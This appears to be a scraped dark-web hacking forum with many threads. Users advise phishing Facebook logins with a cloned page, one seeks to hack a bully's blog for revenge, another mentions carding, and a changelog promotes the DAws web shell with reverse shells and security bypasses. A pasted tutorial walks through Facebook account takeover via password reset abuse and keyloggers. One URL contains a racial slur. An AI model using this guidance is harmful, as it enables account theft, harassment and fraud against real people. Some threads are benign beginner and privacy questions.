aDEADfish somehow your advice contradicts itself and it doesn't look like you actually know what you are talking about.1) You suggest Social Engineering as the simplest way and then go on about suggesting to just have the victim type his password into a completely fake setup that the attacker controlsso my question as the OP would be a) How do i get the victim to do his "input" as you call it? without having a fake Facebook log in page, a fake Facebook domain page or a fake Facebook email domain?b) You say it is really easier than learning a "new" programming languagec) How would the OP "make" an application without coding/scripting skills?d) How would the Op "know" the OS of the victim in the first place? Guessing doesn't seem to be a reliable method...2) Using an exploit? where would the op get one and how could he use it without everything mentioned before?3)a)Brute Force attacks do not work on Facebook for several reasons...at least not in the way you describe it. What you suggest is almost like saying concentrate real hard and guess the password.b)phishing requires  a couple things too, which you didn't really mention before..well at least not in a clear manner.
NJF with all the respect, but bruteforce and dictionary attack works with FB,just write a bruteforce tool that avade the FB 'number of possibility firewall'
BlackArchSE i am aware of that, that's why i said to aDEADfish"at least not in the way you describe it" My main point was that it is not as easy as people say, if you have  little knowledge about hacking in general.Like you explained in great detail in this thread http://rrcc5uuudhh4oz3c.onion/?cmd=topic&id=12232, there is much much more that one would need to know for actually getting into any accounts.
NJF1) having a layout which looks resiobaby "real" (for example a fake FB page) is kind of self explanitory- dont you think? I think everyone is capable of knowing that no one will enter his password into a completly random dialog for example.2) what abou me saying "input" ?3) learning a programming language for making something like a phishing site is not rocket sience. Ofcourse it takes time but does that make it "hard" ?4) OBVIOUSLY you would need the make the application WITH a programming language...i think this is clear to everyone.5) i did not say it WAS reliable. It isent the hardest to find out the OS. Ask? I dont think a normal FB user would get suspicious (at least when the question is laydout with a bit of brain, not like: whats you OS cuz i wanna hack your acount!6)i only mentioned the exploit thing as i wanted to state all POSSIBLE mathods. It was not my aim to do it for him or give him a tutorial.7) With bruteforcing i was only explaining the basic idea behind it. I did not go into detail.8)As i said above, i was only stating methods NOT giving a tutorial or a list of items or else you need...I was giving methods, ideas for him. He should really do the work his self and not ask for others to do it for him. + i was assuming he knew near to nothing about this subject and he wasnt the most detailed person.
NJF & aDEADfish i appreciate both of your guys input...NJF what aDEADfish is explaining in the previous comment about social engineering and tricking the person into loging into a fake facebook login page...is what im looking to do in this situation and it relates to what i emailed you about also highly.....***adEADfish***man if yuo can show me how to make a fake page like that would be aamazing. i can do the social engineering part...also i would love to be able to learn the samemethod but using .onion page login's...im good at the social engineering aspect of this .....iactually used kali linux in order to clone a facebook login screen using setoolkit and selecting credential harvester cloning machine or something along those lines...it was fairly simply and there are numerous tutorials on doing it i watched a bunch of them for surehours at least. and i only managed to open up "cloned facebook link" within iceweasel browser and only do it to myself i wasnt able to take that link and open it up anywhere else. was kind of weird probabaly something very simple though....but imagined the method wouldnt be too much different for a .onionthats all for now thank you

Clean net site. Worth a read. http://www.pcworld.com/article/182180/top_5_social_engineering_exploit_techniques.html 
@golf_wangSocial engineering tool-kityou can specify the Site/directory to clone.then you just have to link it or make a domain redirect to it, in a manner that is convincing.//G0dR4pe 
i would rather not 'show' you how to make a 'fake facebook loginpage'. This has numerous reasons. This is more than simple however and as you said there are more than enough tuts on the web, maybe even in the forum. Kali is good, thats where i used to hang around in front of my display and learn the tools. Besides; the normal internet crowed (facebook addicts and so) are more than often stupid as my trash can...    Have a logo missing or maybe a wierd afrees, wierd something, for them its just nothing. Most dont think about it in the slightest way. I had a friend (totaly fb addicted, posting every few hours some crap) and i tricked out all his information with a simple black and white html page with the adress of random numbers. There was no logo or anything other than "FACEBOOK LOGIN" in bold and he entered everything the site asked for. Pathetic...Other than that, good luck! (and do yet choose careful of how well you want the trick to be done, depending on your target. Heres a tipp: dont waste you time for a snails brain )
Srry about my latest post i was using my phone and it sent the message ten times, hope that doesnt happen with this post
Dont ever use you phone xD//G0dR4pe
I am completely new to coding. I have no prior knowledge, and I want to learn how to create and modify applications for unix environments (such as Debian, Ubuntu, Fedora, or OSX). What languages should I start learning, and where should I learn them?Also, I have no money to spare on this, so, if it is possible and easy for you, please link free resources to learn code(s) (and I'm not very sure that codeacademy.com really teaches much, or so I've heard). I would be so grateful, and I trust that lurker users who are also tight on money would be grateful too.
I'll be straight up with you. Generally, what language you learn doesn't matter too much. I would advise Python, since I've heard it's a good language for beginners. Personally, I was taught Java first. To be honest, I would strongly recommend you check out codecademy.com, because it will teach you the basics and encourage you to learn more. If you feel like you're spending too much time figuring out what to do as a beginner, just dive in and do Python at codecademy. After you've finished there, come back and I'll give you a rough idea of what to do afterwards. If you want to do Java for whatever reason, I would strongly recommend Head First Java. It will teach you the basics, as well as give you a decent sense of OOP concepts such as polymorphism. Use stackexchange if you have any questions, but use Google first. You might want to know what kind of IDE you want to run, and this choice is completely up to you. I really like Sublime Text when working in Unix environments, so I could push you in that direction. I currently work in Java under Eclipse, but I am considering trying out IntelliJ.Best of luck.  
I was taught Java first too. But i advice you to learn C/C++ and Python first and then move on to Java. I believe will be easier to learn Java if you already know C/C++. Also, C and C++ will help you for Unix-based systems applications and Python is a good scripting language.
Python is enough simply and powerful.
Learning the Linux command line is a good idea. You can find the free book version here. http://linuxcommand.org/tlcl.php w3schools.com, code academy, microsoft virtual academy, and quite a few other clear websites, all offer free tutorials, covering a variety of different programming languages. Most of them are free to access. 
There's many things you should learn. First yes
I cna vouch for codecademy, great lessons and they keep adding languages as well.
I agree with BlackArchSE
Hey, It has been a while since i have been active, because reasons. One thing i have noted however is my general lack of understanding. Currently i am a script kiddie who works in a fake IT company. The company itself is more of an advanced googling department for hire. My concern is this. I have been trying to learn more about computing to protect myself and some interested friends, but it seems like i am missing different key concepts that would help me. What I would like to know is if there is some chart that i could follow from pretty much a newbie level to grasp and understand the different concepts behind computing. Almost like a start here and goto there map of things to learn if that is possible. Would any of you be willing to help me out? Thanks in advance.
What is it that you want to protect yourself (and your friends) from?And how would you define computing in your own words?
I am trying to protect my friends and i from the government. Not that we are doing illegal things, but the american government is becoming progressively invasive into private life. Second, When i speak of computing, i am really just trying to know how things work on an advanced level with computers. Personally i am a knowledge seeker. If i had the resources, i would study computer technology on every level even down to the binary. What i really seek though is i am actually trying to become CEH certified as a career choice. So i need to learn how computers function and communicate between one another. this way i can remain anonymous and help my friends to do so. to go further into the issue, i can really only explain through a metaphor someone else used on me. if computers were building a pyramid, my pyramid would be full of holes.  I want to be a pen tester, but i struggle with networking. My job training has given me insight to bring down all of a Pharmaceutical Company for at least a week because of the access and understanding i was given, but i do not know the basics of things like networking. I am trying to build a road mad so at least i can start and head towards my goals, but i am not quite sure how to get there. for example, i know which scripts to run to perform a pixie attack and gain access to my neighbors wifi, but i do not know how to do 90 percent of what kali linux is capable of. I am trying to fill in the gaps of knowledge so i can understand how all of it works and be more than a script kiddie, i really just don't know what to google to gain that understanding. I hope i am not too confusing. I am just fallen by the wayside looking for a compass, and it seems here would be one of the better places to learn. Plus i have plenty of time to research anything i need to and am willing to put in the work for it. oh and @NJF, Thanks for responding. 
Alright L0ki9 go to ebook3000.com and get books abouttcp/ipnetworkspython, c, c+ metasploitkalietc etcAnd anything else that interests you.Pick one of the many kali programms and look at what language it was programmed. if you understand that language, speak it so to say you will understand what the programs tell the computer to do. And you will at the same time understand why it works and it might give you the chance to come up with your own scripts.And do all that the the3coder said in the "how to hack "thread...that is gold for the level you want to attain! I would reccomend to you OSCP and CISSP(ISSEP) instead of CEH.CISSP books are also on the link i gave you above.
Hello IE.Im currently researching about Cloudflare protected sites.is there any way to get into them?everything involving the direct IP is getting a Error pageso is there a way to sort out where on the cloudflare server the specific website is on.im trying to take down a scam website called [csgoammo]which is stealing valuable skins from ppl.and sadly one of my friends lost over 600 usd to there scam-site.does anyone here know anyway to possible take this scamshit down?

The shell now checks if it can CHMOD a directory(by comparing the values of the directory and the current process's owners) instead of just skipping one that doens't meat the requirements when looking for "DAws's directory".2. DAws now "copies" itself to "DAws's Directory" then drops the .htaccess and php.ini files, which are suppose to make life easier if suphp is installed, if that directory is within the web directory. It'll redirect the current user to that new copy of DAws. Because of all this DAws is much faster now since it is in its own directory, the right table doens't have to be full of crap that we don't care about and bypassing security systems if suphp is installed is now guaranteed.3. Fixed some "serious" permission bugs in the File Manager which were causing "Rename" and "Del" to appear/disappear when they shouldn't be.4. You can finally CHMOD a file/directory using the file manager. I am not sure why it took me so long to add this but who cares? It's here now, enjoy.5. Added File Owner and User's Group to the File Manager. Having this information is needed and should've been here since the beginning because the permissions makes no sense without it and I kept pushing this update because it's not "that" important since DAws checks everything for you but again, who cares? It's here now, enjoy lol.6. You can now "Wipe" a file instead of just Deleting it which makes it mostly impossible to get it recovered. DAws will simply replace the old file bytes with null ones, this isn't a very good "wiper" but it gets the job done pretty well.7. DAws now supports PDO for the Sql Connector. This is useful and needed in case "mysqli_connect" was blocked.8. You can now specify the "Host" when using the MySql Connector since the Host isn't always local and since a remote MySql server connection can be blocked unless it's coming from a specific client, so having this is obviously a  good thing. 9. You can now save the output of any Sql Query which is pretty useful if your MySql User had no file privileges.10. You can now execute Python, Perl and Ruby code on Windows.11. You can now chose the type of a Bind/Reverse shell instead of it being done automatically for you because why not? In some specific cases a coding language may fail because of some process restriction, for example, and DAws can't know that so this small change should solve that.12. You can now chose whether you want a reverse/bind shell or some eval code to run in the background or not(threw nohup for linux or start for windows) instead of it being chosen automatically for you.13. A dynamic fake 404 page has been finally added. (The code of the static one has been commented and is still at the top)14. DAws now checks if the current server is vulnerable to Shellshock threw "normal" command execution, I know that this isn't beneficial for DAws but it's good and useful information and you can now see it on the left table. (Keep in mind that DAws already uses Shellshock threw 2 methods to bypass security systems but this is completely something else).15. Removed a lot of extra lines that were holding nothing but a "{" for the sake of scrolling when reading the code...16. Fixed a lot of small bugs that were causing stuff like: showing the wrong location of the dropped cgi shell, wrong data in the .htaccess file for suphp on windows, getting redirected to the main shell's directory when using something other than the file manager, etc...Github: https://github.com/dotcppfile/DAws
Thanks for sharing! And good Job!
Any lads or lasses have Onion links to markets with hacker training tutorials?(Also with info on how to anonymously pay for said tutorials?)
No need to pay.
the3coder,No need to pay, you say? Ah. You're talking about freely available tutorials, such as those found on Youtube, or through various hacking forums on the Clearnet?I agree you can get some very valuable information from those sources, but what I am generally talking about here are step-by-step tutorials on individual hacking activities.For example, step-by-step professional "how to hack a Gmail account" or "How to make a No CD crack for the Latest BioWare Game" etc.One can find plenty of "tutorials" on the clearnet, but many are sloppy, are not really made by professionals, and are not designed to take someone with little to no experience, and teach them precisely what to do for that SPECIFIC activity.I am thus curious as to what markets, if any, may offer tutorials such as I have described, and whether they might be found for free, or if not, what to expect in terms of cost.
Hey IE, I was looking around a little and I found something huge. I found out that someone made a botnet that can strip Proxies, VPNs, Tor Proxies, Tails Proxies, etc. with just a link. This could mean something huge for everyone. What are your opinions on this? How do you guys think this works? What could this mean for the Tor world, specifically hitmen, cp, etc.? This is seriously a fucking game changer. I'll try to get a link and hit you guys up. Till then, see you!-Yui
Need a link/code, anything, something to study and explore and see what you are talking about. If that's true, then I suspect government/agencies
It's not Government, I'll tell you that. I know exactly who the source is, but he disappeared. If I ever find him again, I'll find out what it is and what it does and get you guys a link as well. Hopefully this works out and I find him.-Yui

Hi Huys,Already asked this on the chat, maybe everyone is sleeping :)Are ther any undedrground music production forums/board in this depth of the net?
There are a few music radio streaming sites here, but I don't think any have a board...
:(Can't believe :(
Never give up!http://www.fullchan4jtta4sx.onion/musicprod/index.html
 I almost literally made an account just so I could respond to this. Im in the same boat looking around for underground music around the deepweb. Im always on the lookout, we should PM each other if one of us ever finds anything! 
I'm quite sure the PM system on IE doesn't work.
Some interesting music in here. I recommend checking it out. http://lolicore75rq3tm5.onion/archive/ 
I'm on Android, I tried a few servers on OpenVPN which didn't stop data being used.
Ooh, that sounds like something I need haha. I hope you find out what you need mate. I'll do a little personal research now. If you find anything, hit me up alright?
Yuicide if you want to do yourself a favor research how mobile networks work.There are "free" illegal ways but not like 322274 describes.Ask Yourself what a VPN actually does and what it has to do with "hiding" the amount of Data Transferred? (the Answer is nothing)
Let me put this in simple terms @322274, you don't.
So I bought a phone offline and it has a bad IMED number, no way to get the phone company to clear it or anything, this was meant to be my upgrade to my normal flip cellphone so thinking that I could clone my own phone so that way i could use the better one without anyone being the wiser, unfortionatly I cant find crap on the clearnet and I'm still in my early stages of learning programing/hacking so looking for anyone who has done this succesfuly and would be willing to help me out.*Here in England the normal peace sign and it reverced (showing the back of your hand to the other person) is called giving someone the tongs meaning victory (normal) or F you (reverced), hence my name T0ng5, you choose what side you are on (this was used in thh begining of the kingsmen movie).
PS the new phone is a moto G.
Hello, I have recently been looking for a brute force program that is capable to actually do brute force, i have tried brutus and THC hydra but neither were able to do brute force good enough. i was wondering if anyone knew any and if you do a safe way to get them.<[Arion]>
It depends on the type of encryption you want to break. You need to search by the type of encryption, like md5, AES, etc. John The Ripper is decent to start out with. Also you want to do dictionary brute force before doing a regular brute force because it has a better chance of success.
okay thank you for your input! i will check this and report back how well it works.<[Arion]>
Brutus is old as heck man. Brutus is XP style.
I'm one of those poorfags making minimum wage
Hey everyone I'm writing here today because I have been dealing with the problem for over a week now with no results.I went and installed Tails and got it all set up but for some reason it would never connect to Tor or the unsafe web browser. I tried unspoofing, setting up another network, even tried bridges thinking for some reason that would work, nothing did. So I basically gave up.Then I tried getting Whonix, I tried to install it with Virtual box and it wouldn't install. Something about "write same file error, manually zeroing" I tried fixing that with no results. Then I tried Qubes, I got in on my USB but when I boot it all it says on a black screen is "start up USB boot" or something like that and nothing would happen. I read alot of people suggested using Qubes with whonix, but how can I do that when it won't even boot!I've tried what seems like everything. I'm not a tech savy person per se. I pretty much know what I need to know and if something comes around I don't know I research it. I don't know what i'm doing wrong with any of these and I feel like my head is about to explode with frustration. (just watch it'll end up being a simple fix and I will look like an idiot lmao)If you have any advice or suggestions it would be greatly appreciated. I don't do anything illegal on DW, I just want extra protection and anonymity.  
Before i write down my question i have to give some backstory.My best friend from childhood met me with a girl,a very smart person and recently became a very good friend of mine.One night my friend told me about one of my new friend's bullie,that she was before her friend but she isn't anymore because the bullie thinks that she is a princess(by that i mean she thinks that she is the most important in the world,she deserves everything and that she can do what she want;no,i'm not exaggerateing)and she started to turn everyone against my new friend,even the teachers.Now,the topic:I want to destroy her and by that i mean to let her feel what my new friend started to feel,the jokes that were made about her and the mockery.She has a blog and i want to find her account,to hack the blog;it dosen't matter how,i want to destroy her.Please,if you have any way of help,sites,tips,anything,it dosen't matter.Thank you in advance.

You can get FalconView for free from their site.  If you are looking for the classified stuff, the only thing that makes it classified is the imagery that is loaded into it. 
I had FV for ages now, but there is actually more useful stuff on the software level than the imagery in the editions i am searching for.
Hi Guys and Gals, can anyone on here show me how to generate custom lists wit python or jsi want to integrate the lists later on for brute force or data mining into grease monkey.what i am looking for is something like thisbased on a carrier range and given numbers the script should generate the full amount of possible numbers like this+(countrycode/carrier)***(given value)the given value is known so it needs to stay the same,the Asterisk part is unknown and should run from 000-999 or 0000-9999 or what ever digits your phone number in your country has.here is an example for Nevada+1-775-000-1234....+1-775-999-1234or+1-705-000-1234 .... +1-705-999-1234what also would be useful would be a script that can generate email addresses based on dictionary lists if you know parts of itb******s@gmail.comso your list contains all words you could come up with 8 letters and b at the beginning and s at the endbanditos,bandanas,bermudas,burritos etc. , etc.so far this would be all for stage one...any pointers, tips and so forth in regards to doing this ?
For anyone who might be interested in similar topics... Burp Suite has a decent option to do the above.

is it possible for me to find out the gps location of a photo that was taken? if so can someone show me how to?..and if not then ill be glad to send someone a lil btc to find it out for me please and thank you.
If the exif data does not contain a grid it's a no go for you.Unless the photo itself contains useful hints and info....certain plants, signs, sun position, time, etc...would be easier to go after the one that took the photo.check his hardware if you can... correlate timestamps or numbers from other pictures... location logs from a cellphone if it was used as a camera... there are many possible ways but you need to be more specific.
well i know the picture was taken during the day time i know what city it was taken in i know that it was most likely taken with an iphone...i also have the phone number to that phone ....is there a way to ping the phone??. the cops do it all the time lol...but more specifically yeah i want to go after the one that took the photo. @NJF thank you for your response
Did you check the exif already?Going by content of the picture itself is a wild shot, but it can work out sometimes. Have you thought about social engineering your opponent/target? 
yeahidid....alright thanks man..and yeah i been trying too but my account keeps getting blocked everytime i make a fake one they want a picture of an ID now on facebook its ridiculous
Try to use a proxy to set one up in another country.
i dont know how to use proxy i was actually looking into socks5 so i can do some carding maybe you can show me how to use proxy cuz thatd help me in both cases
Hit me up on NJF@sigaint.org
ok i did
If GPS was really used, you can extract it using exiftool.
NJF was the most helpful in this thread!!!! hes the go to guy forssurre!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Hey guys just wondering how to stop people from click-clicking, highlighting, and pressing F12 to veiw the source code for a website, there is a website that has got this. I am wondering is anyone has the script for it?If you want proof this works here is a website : nigger.li (Ran by Ozn)
No such thing. I still can view the html of that website
If you want to hide the source use PHP or Rails.  The HTML/CSS/JS/DOM are always visable.  The browser and developers need access to them.
Enter "curl <your url>" in the commandline and enjoy the HTML source. Blocking the HTML source? What year is it?!?
I don't think that's possible; as others have said, you would need to provide the HTML/CSS for the browser to even display it
Can anybody instruct me on how to download from the deep web without revealing my ip or anything about my identity period. I found a link on here to the strategic intelligence network but everything is jpeg pdf, and things of that nature.
Use Tails Live, download, disconnect from any inter or outer net, export to usb, import to a Virtual Machine in other pc/device system. Open. After you download, DISCONNECT from internet.More interesting: Once you have got all your files in another anonymous system and virtualized. Open wireshark and sniff your own traffic while you opening the files and watch what happend and where servers connect cause there could be a valid string to pull more info related to your files.
Use Tails Live, download, disconnect from any inter or outer net, export to usb, import to a Virtual Machine in other pc/device system. Open. After you download, DISCONNECT from internet.More interesting: Once you have got all your files in another anonymous system and virtualized.

Sorry for double post wasnt on porurpousse.
Thanks for the info. Can I do that from my tower? I'm not exactly mobile.
Yes @W1LLSON, if you can boot your system from a dvd you should be ok to run practically any live OS, incluiding Tails.Anyway I-m not an expert so best is getting info from official web.You can do also from a bootable USB but I have to tell you that I tried this Twice and first didn't work cause at least 4Gb is needed, and second I broke up an USB... Also you can virtualized with Vbox o MWare but this is considered unsafe! if you don-t know what you doing choosing this could be a 'trap'
What strategic inteligence network can you share ? on pm if dont wanna make it public
@1333 ok thanks. I wasn't to sure if that was safe to use at home, or if you needed to take tails elsewhere. @K1du It is an onion were they have TONS of files. mostly pdf. A lot are mil. and gov. docs. All kinds of shit really. Unforunatly I changed machuines and lost the adress for it. Lost some bitcoin when I did it to.
Ok .
Using Parrot Security OS use a free-password modem (or just crack it)with no security cameras,now change MAC address, run AnonMode (TOR and FrozenDNS with Iptables setting) , open iceweasel with noscript and set Startpage like search engine. *google is blocked.
Hi,I am searching about operating systems for a while and I've read a lot of documents about it but it seems there is no %100 safe operating system. What I'm talking about it, for example if you're a Windows user, if you do illegal things and when federals got you, they can reach a lot of information from your computer, even if you deleted the files. I am searching for a reliable, safe and secure OS. I've heard about AnonymOS but I've never tried. Is there anyone who tried AnonymOS? Please hit me up, would be perfect.
There is no 100% safety. But you can give Tails a try, furthermore I recommend this thread: Keeping safe on the Deep Web
Thanks a lot man. I will check Tails and I'll read this thread. And I'm open to all other answers.
No 100% saftey, anywhere and everywhere. Only Linix is '100%.'
Nothing is 100% safe, and nothing will ever be.Knowing what you're doing and what's happening is the best safety procotion.
Whonix seems pretty promising. It's a dual virtual machine OS which makes it nearly impossible to grab your IP address.
Try tails and Whonix Zetra .
No such thing.  OpenBSD is close if you know what you know how to use it.
@zetraulax AnonyOS is not maked by us(Anonymous). It seems like a packed up OS with trojan and virussen. And batch files that delete ur windows system. It can be have a backdoor for feds. To be short use it in virtueel machine and never use it for anything. IF u wanna have secure OS. Try use Tails, Whonix or debian. if u wanna learn more check out this website. www.privacytools.io 
Hi, i suggest the Italian Distro, Parrot Security OS, with the Anonymous Mode already installed.It is based on Mate Desktop and can works in forensic mode too.Tails too, but i've the suspect it is too mainstream...is the first place where N SA go to put hands.Anyway the important is use a Linux distro,Ubuntu,Debian,Arch etc...and configure it for you.
I was wondering if anyone knows any .Onions for security cams around the world from traffic cams to store cameras?<[Arion]>
I prefer to chat using my email: lilman@sigaintevyh2rzvw.onion

OK, so I have started this thread since I want to learn more about the art of modding your device. Any tips and suggestions on this few topics?-Governors-I/O Schedules-Undervolting-Overclocking-New kernel features*Note I am trying to do this on a Unofficial Kernel as the device manufacturer decides not to open up the source code, thus violating GPU GPLv2 
Read up on AOSP and Linux kernel development.  There are relatively few people who actaully mod kernels.  Most of them are probably busy with development.
@q8b8 I kind of pity the kernel mantainers since they usually always get criticised
Let people talk.  Noone else is doing the work.
If you hava rooted phone, you could install the XPosed Framework and the app "Android Tuner Free", which requires root access and can change kernel properties, over/underclock your phone trim partitions and more... If you want to tune your UI, have a look at the apps that use the XPosed Framework, there are a lot of them.
@the3coder It really depends on the kernel itself not how you can tune it. Some devices come underclocked stock and therefore you can overclock it with root
Any good torrent sites out there aside from The Pirate bay?
torrentz.eu  gives you a search option for a couple dozen.
Thank you very much NJF I'll check it out 
I believe the best torrent site out there is " kickass.to " ( this is a surface web site ).  It may not always have exactly what you're looking for, but it does have a wide variety of pretty much anything.  I've never used the Pirate Bay nor would I wish to, as I've heard it's been under the government's eye lately.
I have tried kickass, but I have a lot of problems finding the things I am looking for that still have seeders.
Yeah, there's usually not too many seeders.  The only thing I use it for though is movies and music, and both can be found online ethically anyways.  It's just more of a luxury to actually have them stored on a computer.
Is pointing tor at a loadbalancer the solution to scaling a hidden service?
You could use them, but the bigger problem is having enough bandwith to transfer/relay all the data to tor nodes AND your load balancer. Also, you should make sure all the data sent to your load balancer is encrypted (or at least only installed on your internal network), otherwise your hidden service won't be hidden for a long time.
Once in awhile I capture packets with wireshark on open networks.  But, I don't fully understand the happenings.  Hoping that someone here might want to take a look and give a summary.  Mostly looking to see how my traffic and equipment looks on the network.
To "interpret" the packets, you need to know how exactly the internet works... I recommend reading a lot on TCP/IP, 802.11 and UDP if you want to understand whats going on... Otherwise, wireshark will not be of great use for you.
Problem solved
i was  wondering if any of you guys knew of any tutorials or had any advice into making an onion site. as for what i plan on putting there, it's nothing too crazy really, just a survey, some questions. thanks, any help would be appreciated.  
http://rrcc5uuudhh4oz3c.onion/?cmd=topic&id=10789ctrl+f gives you a search function.... just saying
You'll probably want working knowledge of HTML/CSS to make the site in the first place... I would advice against using Javascript since people usually turn that off
Wondering if anyone has experience in the field of cryptography. Is it something someone can pick up with adequate knowledge of coding and mathematics, or is it complicated to the point where it requires a Ph.D? 
Wow that is weird. In the past couple hours or so I've been practicing on some random website and I managed to get the hash to the admin account. Sadly since I am quite new I can't crack it. I can't even identify what type it is! I would enjoy it if someone would help guide both of us in the right direction.Noob at your mercy here
@sunAmpac && @MustardCoated    Did you two googled what you want to find?It's good for starting point.@MustardCoated                 Even on youtube you can find videos for starting, searching for Cain & Abel, johntheripper etc..
I would be interested if there was any instant messaging client that was a bit more "secure". I mean of course whatsapp, being owned by facebook, probably has its data bought by third parties for big bucks. But does anyone know of a messaging app that would be impossible (or very hard) to be tracked? It would be awesome if you could share pics for example. Or if it had something like auto-destroy after a while.There was this thing named hemlis (website, clearlink, heml.is) and they were building quite a beautiful app and seemed promising. They were saying that even they couldn't themselves see the messages you sent using their app. Seemed a bit hard to believem but anyway the project was shutting down last time I checked on it. They were in the beta-testing phase.
If you really want to be secure, your best bet is to set up your own irc server as a hidden service or on a private network, and use either pgp or otr whilst you communicate on it. If you do not wish to take action yourself, you will have to trust someone else's server (although some such as anarplex, where this site's irc is located seem fairly respectable), and most likely create your own channel, however I would definitely recommend the use of otr or pgp in such a case.
Thanks for your answer. I would prefer an application that would be appealing to others, I talk to a fair amount of people, and I would need to convince them to use what I want to use. I don't think an IRC would be a solution for me. Even though I was pretty hopeful about hemlis, I found nothing like it yet..
An appealing and secure messaging application..  telegram.org might be what you're looking for. (even has the auto-destroy after a while lol).  I haven't used it myself, but I hear good things about it.

Hey, I was wondering where can I download the doxbin source code? I have tried to download it and people that posted a link on forums removed it and the dowload websites don't even download the file. It would be much apeciated if someone could give me a link to an accual download.Kind regards, Sp00fer
Is there someone that can explain me how I can hack PayPal, of course if it is no problem?
Learn to program and understand the programming languages which PayPal use, then you might be the one amongst ten thousand other programmers to actually find an exploitable security hole while trying.How to hack PayPal is not just something you can ask, it requires a proper security hole (a critical part of the code needs to handle user input incorrectly/insecurely), and knowledge of how to write the code for exploiting that security hole; once in a while when someone does discover one, that person is very unlikely to share that discovery for free because it's worth money, even more unlikely since the security hole would get fixed hours to a few days after such public release.Sorry but it's a no can do, unless you have a giant amount of spare time to learn the necessary skills and to wait for luck to strike.
To hack PayPal i think there is certain amount of php or html, and there i dont know anything...So whatever i guess my question was quite stupid.
Naah, it was a legit question.
http://z2hjm7uhwisw5jm5.onion/ Once you join they have some info on it
Most people try to use Sentry MBA or someother bruteforcing tool to get PayPal and such accounts. 
You can try send a phising site to the email and hopfuly they fill out the details.
Alright, I hardly have these types of questions but I'm at the point where I have no more resources.A friend of mine said something to me while I was sleeping but then removed the messages so I couldn't read them. I looked into chatsync to see what he said, then the errors began. My mistake was looking into them with skype still active knowing that thoes documents upate as Skype runs anyway. > Uninstalled, Re-installed, restarted> Removed from registry> Deleted Skype data in appdata> Replacd Skype data with an older version (Before this began)> Replacd Skype data with another accounts> Replacd chatsync (only) with an older version & other account's> Synced new Skype data after installAfter replacing Skype data with an older version, the errors ceased all but one. I'm now able to message everyone just as before, though I can not message the person that removed the messages to which this begin. This is the only user I'm unable to message, call, unfriend, favorite and crashes my client if any is attemped. This person is someone I mesasge daily, and I'm not smart enough to make the connection with chatsync having anything to do with this user. (I have gone to customer support about this, they have no solutions. In fact, they had no helpful information at all.)Any ideas/solutions?
Is she pretty ?
Sounds like you're on his/her blocklist or he's/she's on yours. 
@K7N3X - No, we've done nothing of the sort. I looked into it and turns out I've permanently destroyed the account. The change was related to my client's DB, which in tern transferred the change to the Skype servers. So every machine I logged onto on Skype using that account would sync the data into the client DB from the server. No matter if I uninstalled the program, whipped every trace of Skype from my computer, my failure would always sync back into my account even if I were on mobile, or another computer.I could be wrong on that statement, but it's what I've observed. My friend said I most likely found an exploit, though I'm sure Microsoft has patched it by now.
...And how to protect yourself from them. Hey guys. I haven't been very active on here recently cuz I'm dealing with life. LoL anyways iv got some candy for my fellow noobz and maybe even the pros could touch up on a thing or two? Its facebook hacking (like the title says) and I will be shamelessly copying from a site. Ill be decent enough to give them credit (its a clearweb site) http://null-byte.wonderhowto.com Here goes the pasting process :p. Despite the security concerns that have plagued Facebook for years, most people are sticking around and new members keep on joining. This has led Facebook to break records numbers with over one billion monthly active users as of October 2012���and around 600 million active daily users.We share our lives on Facebook. We share our birthdays and our anniversaries. We share our vacation plans and locations. We share the births of our sons and the deaths of our fathers. We share our most cherished moments and our most painful thoughts. We divulge every aspect of our lives. We even clamor to see the latest versions even before they're ready for primetime.But we sometimes forget who's watching.We use Facebook as a tool to connect, but there are those people who use that connectivity for malicious purposes. We reveal what others can use against us. They know when we're not home and for how long we're gone. They know the answers to our security questions. People can practically steal our identities���and that's just with the visible information we purposely give away through our public Facebook profile.The scariest part is that as we get more comfortable with advances in technology, we actually become more susceptible to hacking. As if we haven't already done enough to aid hackers in their quest for our data by sharing publicly, those in the know can get into our emails and Facebook accounts to steal every other part of our lives that we intended to keep away from prying eyes.In fact, you don't even have to be a professional hacker to get into someone's Facebook account.It can be as easy as running Firesheep on your computer for a few minutes. In fact, Facebook actually allows people to get into someone else's Facebook account without knowing their password. All you have to do is choose three friends to send a code to. You type in the three codes, and voil�ى��you're into the account. It's as easy as that.In this article I'll show you these, and a couple other ways that hackers (and even regular folks) can hack into someone's Facebook account. But don't worry, I'll also show you how to prevent it from happening to you.Method 1: Reset the PasswordThe easiest way to "hack" into someone's Facebook is through resetting the password. This could be easier done by people who are friends with the person they're trying to hack.The first step would be to get your friend's Facebook email login. If you don't already know it, try looking on their Facebook page in the Contact Info section.Next, click on Forgotten your password? and type in the victim's email. Their account should come up. Click This is my account.It will ask if you would like to reset the password via the victim's emails. This doesn't help, so press No longer have access to these?It will now ask How can we reach you? Type in an email that you have that also isn't linked to any other Facebook account.It will now ask you a question. If you're close friends with the victim, that's great. If you don't know too much about them, make an educated guess. If you figure it out, you can change the password. Now you have to wait 24 hours to login to their account.If you don't figure out the question, you can click on Recover your account with help from friends. This allows you to choose between three and five friends.It will send them passwords, which you may ask them for, and then type into the next page. You can either create three to five fake Facebook accounts and add your friend (especially if they just add anyone), or you can choose three to five close friends of yours that would be willing to give you the password.How to Protect YourselfUse an email address specifically for your Facebook and don't put that email address on your profile.When choosing a security question and answer, make it difficult. Make it so that no one can figure it out by simply going through your Facebook. No pet names, no anniversaries���not even third grade teacher's names. It's as easy as looking through a yearbook.Learn about recovering your account from friends. You can select the three friends you want the password sent to. That way you can protect yourself from a friend and other mutual friends ganging up on you to get into your account.Method 2: Use a KeyloggerSoftware KeyloggerA software keylogger is a program that can record each stroke on the keyboard that the user makes, most often without their knowledge. The software has to be downloaded manually on the victim's computer. It will automatically start capturing keystrokes as soon as the computer is turned on and remain undetected in the background. The software can be programmed to send you a summary of all the keystrokes via email.CNET has Free Keylogger, which as the title suggests, is free. If this isn't what you're looking for, you can search for other free keyloggers or pay for one.Hardware KeyloggerThese work the same way as the software keylogger, except that a USB drive with the software needs to be connected to the victim's computer. The USB drive will save a summary of the keystrokes, so it's as simple as plugging it to your own computer and extracting the data. You can look through Keelog for prices, but it's bit higher than buying the software since you have the buy the USB drive with the program already on it.How to Protect YourselfUse a firewall. Keyloggers usually send information through the internet, so a firewall will monitor your computer's online activity and sniff out anything suspicious.Install a password manager. Keyloggers can't steal what you don't type. Password mangers automatically fill out important forms without you having to type anything in.Update your software. Once a company knows of any exploits in their software, they work on an update. Stay behind and you could be susceptible.Change passwords. If you still don't feel protected, you can change your password bi-weekly. It may seem drastic, but it renders any information a hacker stole useless.Method 3: PhishingThis option is much more 